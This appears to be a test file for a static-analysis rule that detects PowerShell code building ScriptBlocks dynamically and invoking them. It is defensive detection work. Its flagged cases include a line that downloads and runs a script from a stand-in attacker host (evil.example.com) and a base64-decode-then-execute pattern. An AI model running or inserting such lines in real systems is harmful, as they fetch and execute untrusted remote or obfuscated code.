# ruleid: ps-scriptblock-create-invoke
[ScriptBlock]::Create($encodedPayload).Invoke()

# ruleid: ps-scriptblock-create-invoke
[ScriptBlock]::Create((New-Object Net.WebClient).DownloadString('http://evil.example.com/p.ps1')).Invoke()

# ruleid: ps-scriptblock-create-invoke
$decodedScript = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64blob))
[ScriptBlock]::Create($decodedScript).Invoke()

# ok: ps-scriptblock-create-invoke
$sb = [ScriptBlock]::Create("Write-Host 'Hello'")
Invoke-Command -ScriptBlock $sb

# ok: ps-scriptblock-create-invoke
$block = [ScriptBlock]::Create($userScript)
$result = $block.ToString()
Write-Host "Script content: $result"
